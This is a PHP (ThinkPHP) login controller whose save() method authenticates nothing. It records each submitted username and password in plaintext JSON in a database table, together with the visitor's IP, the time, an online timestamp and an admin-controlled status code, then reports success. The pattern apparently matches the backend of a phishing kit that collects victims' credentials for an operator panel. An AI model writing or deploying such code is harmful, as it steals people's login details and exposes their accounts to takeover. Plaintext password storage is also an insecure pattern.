<?php
namespace app\controller;

use app\BaseController;
use think\facade\View;
use think\facade\Db;

class Login extends BaseController
{
    public function index()
    {
        return View::fetch();
    }
    public function save($username,$password)
    {
        $ip = session('ip');
        $time = date('Y-m-d H:i:s');

        $zt = Db::Name('Admin')->where('id',1)->value('zhyz');
        $user['zt'] = 10+$zt;
        $user['ip'] = $ip;
        $user['time'] = $time;
        $user['online'] = time();

        $user['data1'] = json_encode(['username'=>$username,'password'=>$password]);

        Db::Name('data')->save($user);
        
        $getid = Db::name('data')->getLastInsID();
        add_log($getid,10,'用户登录账号');
        session('id',$getid);
        return json(['code'=>200]);
    }
}
